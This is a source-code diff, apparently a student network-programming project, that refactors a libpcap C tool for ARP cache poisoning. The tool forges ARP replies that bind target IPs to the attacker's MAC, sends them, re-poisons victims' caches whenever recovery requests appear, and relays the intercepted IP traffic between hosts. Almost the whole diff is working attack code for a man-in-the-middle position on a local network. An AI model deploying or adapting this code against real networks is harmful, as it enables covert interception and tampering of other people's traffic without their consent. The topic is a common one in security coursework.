@@ -22,6 +22,7 @@ struct ethernet{
 	uint16_t ethernet_type;
 };
 
+
 struct ip{
 	uint8_t ip_hl:4, ip_v:4;
 	uint8_t ip_tos;
@@ -61,22 +62,22 @@ void print_mac(char * str,u_char * addr){
 	printf("%02x\n",(u_char)*(addr+i));
 }
 
-bool check(u_char * p, int len, struct in_addr ip, uint8_t * mac){
+bool find_mac(u_char * p, int len, struct in_addr ip, uint8_t * mac){
 	int i;
 	struct arp_packet * a_ptr=(struct arp_packet *)p;
 	if(ntohs(a_ptr->ethernet_part.ethernet_type)==ETHERTYPE_ARP){
 		if(ntohs(a_ptr->arp_part.opcode)==ARPOP_REPLY){
 			if(ip.s_addr==a_ptr->arp_part.sender_IP.s_addr){
 				for(i=0;i<ETHER_ADDR_LEN;i++)*(mac+i)=*(a_ptr->arp_part.sender_MAC+i);
-				print_mac("mac",a_ptr->arp_part.sender_MAC);
-				return 1;
+				//print_mac("mac",a_ptr->arp_part.sender_MAC);
+				return true;
 			}
 		}
 	}
-	return 0;
+	return false;
 }
 
-bool check_mac(uint8_t *mac1, uint8_t *mac2=0){
+bool compare_mac(uint8_t *mac1, uint8_t *mac2=0){
 	int i;
 	if(mac2){
 		for(i=0;i<ETHER_ADDR_LEN;i++)if(*(mac1+i)!=*(mac2+i))return false;
@@ -88,55 +89,34 @@ bool check_mac(uint8_t *mac1, uint8_t *mac2=0){
 	}
 	
 }
-/*
-bool check_recover(u_char * p, int len, struct in_addr ip1, struct in_addr ip2, int type=0, uint8_t * mac=0){
-	int i;
-	struct arp_packet * a_ptr=(struct arp_packet *)p;
-	if(ntohs(a_ptr->ethernet_part.ethernet_type)==ETHERTYPE_ARP){
-		if(ntohs(a_ptr->arp_part.opcode)==ARPOP_REQUEST){
-			if(type){
-				if((ip1.s_addr==a_ptr->arp_part.target_IP.s_addr)&&check_mac(type,a_ptr->arp_part.target_MAC))return true;
-			}
-			else{
-				if(ip1.s_addr==a_ptr->arp_part.sender_IP.s_addr){
-					if(mac){
-						if(check_mac(type,mac,a_ptr->ethernet_part.destination_address)&&(ip2.s_addr==a_ptr->arp_part.target_IP.s_addr))return true;
-					}
-					else{
-						if(check_mac(type,a_ptr->ethernet_part.destination_address))return true;
-					}
-				}
-			}
-		}
-	}
-	return false;
-}
-*/
+
+//ip1=send_ip, ip2=target_ip, mac=my_mac
 bool check_recover(u_char * p, int len, struct in_addr ip1, struct in_addr ip2, uint8_t * mac){
 	int i;
 	struct arp_packet * a_ptr=(struct arp_packet *)p;
 	if(ntohs(a_ptr->ethernet_part.ethernet_type)==ETHERTYPE_ARP){
 		if(ntohs(a_ptr->arp_part.opcode)==ARPOP_REQUEST){
 			if(ip1.s_addr==a_ptr->arp_part.sender_IP.s_addr){
-				if(check_mac(mac,a_ptr->ethernet_part.destination_address)&&(ip2.s_addr==a_ptr->arp_part.target_IP.s_addr))return true;
+				if(compare_mac(mac,a_ptr->ethernet_part.destination_address)&&(ip2.s_addr==a_ptr->arp_part.target_IP.s_addr))return true;
 			}
 			else if(ip2.s_addr==a_ptr->arp_part.sender_IP.s_addr){
-				if(check_mac(a_ptr->ethernet_part.destination_address))return true;
+				if(compare_mac(a_ptr->ethernet_part.destination_address))return true;
 				
 			}
 		}
 	}
 	return false;
 }
+
+//ip1=send_ip, ip2=target_ip, mac1=send_mac, mac2=my_mac, mac3=target_mac
 bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr ip2, uint8_t * mac1, uint8_t *mac2, uint8_t *mac3){
 	int i;
 	u_char * new_p=(u_char*)malloc(sizeof(u_char)*len);
-	
 	struct ethernet a;
 	struct ethernet * a_ptr=&a;
 	a_ptr=(struct ethernet *)p;
 	if(ntohs(a_ptr->ethernet_type)==ETHERTYPE_IP){
-		if(check_mac(a_ptr->source_address, mac1)&&check_mac(a_ptr->destination_address, mac2)){
+		if(compare_mac(a_ptr->source_address, mac1)&&compare_mac(a_ptr->destination_address, mac2)){
 			struct ip a;
 			struct ip * a_ptr=&a;
 			a_ptr=(struct ip *)(p+sizeof(struct ethernet));
@@ -157,7 +137,7 @@ bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr 
 			}
 		}
 		
-		 else if(check_mac(a_ptr->source_address, mac3)&&check_mac(a_ptr->destination_address,mac2)){
+		 else if(compare_mac(a_ptr->source_address, mac3)&&compare_mac(a_ptr->destination_address,mac2)){
 	         struct ip a;
 	         struct ip * a_ptr=&a;
 	         a_ptr=(struct ip *)(p+sizeof(struct ethernet));
@@ -176,9 +156,10 @@ bool relay(pcap_t * fp, u_char * p, int len, struct in_addr ip1, struct in_addr 
 	           	free(new_p);
 	           	return true;
 	          }
-      	}
+	  	}
       	
    }
+    free(new_p);
 	return false;
 }
 
@@ -291,7 +272,7 @@ int main(int argc, char* argv[]) {
   
   bool checking[20];
   for(i=0;i<2*n;i++)checking[i]=false;
-  printf("%d\n",n);
+  
   while (1) {
   	struct pcap_pkthdr* header;
   	const u_char* p;
@@ -310,11 +291,11 @@ int main(int argc, char* argv[]) {
     	return 0;
     }
     for(i=0;i<n;i++){
-    	if(!checking[i]&&check((u_char *)p, header->caplen,send_ip[i], send_mac_address[i])){
+    	if(!checking[i]&&find_mac((u_char *)p, header->caplen,send_ip[i], send_mac_address[i])){
     		checking[i]=true;
     		break;
     	}
-    	if(!checking[i+n]&&check((u_char *)p, header->caplen,target_ip[i], target_mac_address[i])){
+    	if(!checking[i+n]&&find_mac((u_char *)p, header->caplen,target_ip[i], target_mac_address[i])){
     		checking[i+n]=true;
     		break;
     	}
@@ -324,17 +305,17 @@ int main(int argc, char* argv[]) {
     }
     if(i==2*n)break;
    }
-  printf("GOOD!\n");
+  
   u_char * packet_attack[10];
   for(i=0;i<n;i++)packet_attack[i]=(u_char*)malloc(sizeof(u_char)*sizeof(arp_packet));
   
   
   for(i=0;i<n;i++)make_arp_packet(packet_attack[i], target_ip[i], send_ip[i], my_mac_address, send_mac_address[i]);
-  printf("MAKE all\n");
-  for(i=0;i<n;i++)pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet));
-  printf("First attack\n");
-  struct in_addr tmp;
+  
+  printf("attack start!\n");
 
+  for(i=0;i<n;i++)pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet));
+ 
 while(1){
 	struct pcap_pkthdr* header;
 	const u_char* p;
@@ -342,22 +323,21 @@ while(1){
  	if (res == 0) continue;
  	else if (res == -1){
 		fprintf(stderr, "error occurred while reading the packet\n");
-		for(i=0;i<2*n;i++)free(packet[i]);
-		for(i=0;i<n;i++)free(packet_attack[i]);
-		pcap_close(fp);
-		return 0;
+		break;
   	}
   	else if(res==-2){
 		fprintf(stderr, "packets are being read from a 'savefile' and there are no more packets to read from the saverfile\n");
-		for(i=0;i<2*n;i++)free(packet[i]);
-		for(i=0;i<n;i++)free(packet_attack[i]);
-		pcap_close(fp);
-		return 0;
+		break;
 	}
 	
+	int j;
 	for(i=0;i<n;i++){
 	  	if(check_recover((u_char *)p, header->caplen,send_ip[i],target_ip[i], my_mac_address)){
-	  		pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet));
+	  		j=0;
+	  		while(j<5){
+	  			if(!pcap_sendpacket(fp, packet_attack[i], sizeof(arp_packet)))break;
+	  			j++;
+	  		}
 	  		break;
 	  	}
 	  	else{
